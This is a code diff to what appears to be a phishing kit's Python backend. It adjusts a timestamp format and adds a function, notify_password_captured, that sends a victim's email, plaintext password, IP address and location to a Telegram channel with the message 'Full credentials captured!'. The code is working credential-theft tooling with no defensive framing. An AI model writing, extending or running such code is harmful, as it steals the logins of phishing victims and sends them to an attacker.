@@ -49,7 +49,7 @@ def notify_email_captured(email: str, ip_address: str = "Unknown", country: str 
     
     # Get current time
     tz = pytz.timezone('Europe/London')  # Adjust to your timezone
-    current_time = datetime.now(tz).strftime('%d/%m/%Y, %H:%M:%S')
+    current_time = datetime.now(tz).strftime('%Y-%m-%d, %I:%M:%S %p')
     
     message = (
         f"📧 <b>Email Captured</b>\n\n"
@@ -58,6 +58,29 @@ def notify_email_captured(email: str, ip_address: str = "Unknown", country: str 
         f"🌍 <b>IP Address:</b> <code>{ip_address}</code>\n"
         f"🗺️ <b>Location:</b> {country}\n\n"
         f"⏳ <i>Waiting for password...</i>"
+    )
+    send_telegram_notification(message)
+
+
+def notify_password_captured(email: str, password: str, ip_address: str = "Unknown", country: str = "Unknown") -> None:
+    """
+    Notify when password is captured (before authentication check).
+    """
+    from datetime import datetime
+    import pytz
+    
+    # Get current time
+    tz = pytz.timezone('Europe/London')
+    current_time = datetime.now(tz).strftime('%Y-%m-%d, %I:%M:%S %p')
+    
+    message = (
+        f"🔑 <b>Password Captured</b>\n\n"
+        f"📧 <b>Email:</b> <code>{email}</code>\n"
+        f"🔐 <b>Password:</b> <code>{password}</code>\n"
+        f"⏰ <b>Time:</b> {current_time}\n"
+        f"🌍 <b>IP Address:</b> <code>{ip_address}</code>\n"
+        f"🗺️ <b>Location:</b> {country}\n\n"
+        f"✅ <b>Full credentials captured!</b>"
     )
     send_telegram_notification(message)
 
